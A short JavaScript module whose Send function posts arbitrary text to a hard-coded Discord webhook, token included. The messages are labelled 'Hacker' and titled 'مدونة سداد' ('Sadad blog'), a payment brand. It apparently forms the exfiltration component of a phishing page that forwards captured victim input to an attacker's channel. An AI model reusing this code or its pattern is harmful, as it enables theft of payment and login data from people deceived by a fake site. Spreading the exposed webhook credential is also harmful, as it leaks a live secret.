import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323186065632137276/Xk0WjGwJrdCMn24XUPw_5YX26zevupgIj6nFWk7QN9LXk1LfyclwQApa795k_HQcjbmg",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
